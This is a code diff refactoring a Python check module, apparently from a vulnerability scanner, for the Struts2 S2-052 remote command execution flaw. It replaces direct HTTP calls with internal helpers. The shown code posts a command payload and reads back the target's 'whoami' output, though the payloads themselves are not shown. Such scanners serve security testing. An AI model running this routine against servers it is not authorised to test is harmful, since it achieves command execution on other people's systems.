@@ -6,20 +6,14 @@ description: Struts2 S2-052漏洞可执行任意命令
 '''
 
 import urllib
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 from urllib.parse import urlparse
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_052_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words) 
+        self.capta = get_capta() 
         self.headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                    'Content-Type': "application/xml",
@@ -147,14 +141,14 @@ class S2_052_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            check_req = requests.post(self.url, headers = self.headers, data = self.check_payload)
+            check_req = request.post(self.url, headers = self.headers, data = self.check_payload)
             hostname = urlparse(self.url).hostname
             port = urlparse(self.url).port
             url = 'http://' + str(hostname) + ':' + str(port)
-            check_req1 = requests.get(url + '/check.txt', headers = self.headers)
+            check_req1 = request.get(url + '/check.txt', headers = self.headers)
             if check_req1.status_code == 200 and self.capta in check_req1.text:
-                cmd_req = requests.post(self.url, headers = self.headers, data = self.cmd_payload)
-                cmd_req1 = requests.get(url + '/cmd.txt', headers = self.headers)
+                cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_payload)
+                cmd_req1 = request.get(url + '/cmd.txt', headers = self.headers)
                 print ('存在S2-052漏洞,执行whoami的结果为:', cmd_req1.text)
                 return True
             else:
